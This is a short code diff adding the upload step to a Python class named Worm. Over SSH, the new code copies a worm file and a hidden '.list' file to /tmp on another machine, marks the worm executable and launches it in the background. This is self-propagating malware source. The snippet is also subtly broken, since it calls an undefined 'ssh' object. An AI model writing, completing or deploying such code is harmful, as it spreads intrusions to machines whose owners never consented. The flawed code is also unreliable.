@@ -43,6 +43,12 @@ class Worm:
             break
 
     def upload(self, sshcon, user, passw):
+        sftp_client = sshcon.open_sftp()
+        sftp_client.put('worm', '/tmp/worm')
+        sftp_client.put('.list', '/tmp/.list')
+        ssh.exec_command('chmod a+x /tmp/worm')
+        ssh.exec_command('cd /tmp/')
+        ssh.exec_command('nohup worm &')
 
 if __name__ == "__main__":
     w = Worm()
